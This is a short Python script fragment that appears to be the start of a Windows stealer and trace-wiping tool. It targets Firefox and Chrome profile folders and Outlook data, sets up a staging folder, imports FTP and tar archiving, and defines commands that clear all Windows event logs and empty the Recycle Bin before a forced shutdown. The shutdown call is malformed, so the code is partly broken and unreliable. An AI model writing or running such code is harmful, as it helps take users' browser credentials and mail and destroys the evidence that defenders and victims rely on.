import subprocess
import os
import tarfile
from subprocess import call
from ftplib import FTP

logged_user_dir = '%USERPROFILE%'
firefox_profile_loc = '%USERPROFILE%\AppData\Roaming\Mozilla\Firefox\Profiles'
chrome_fix = "'Chrome User'"
chrome_profile_loc = '{}\AppData\Local\Google\Chrome'.format(logged_user_dir)
folder_loc = '{}\lmao'.format(logged_user_dir)
logged_user_os_fix = os.environ['USERPROFILE']
folder_loc_for_fix = '{}\lmao'.format(logged_user_os_fix)
outlook_loc = '{}\AppData\Local\Microsoft\Outlook'.format(logged_user_dir)
options_for_wev = '"wevtutil el | Foreach-Object {wevtutil cl "$_"}"'
triggers_for_trash = 'rd /s /q %systemdrive%\$Recycle.bin'

shutdown = subprocess.run(['shutdown.exe'[' -s -t 00 ']])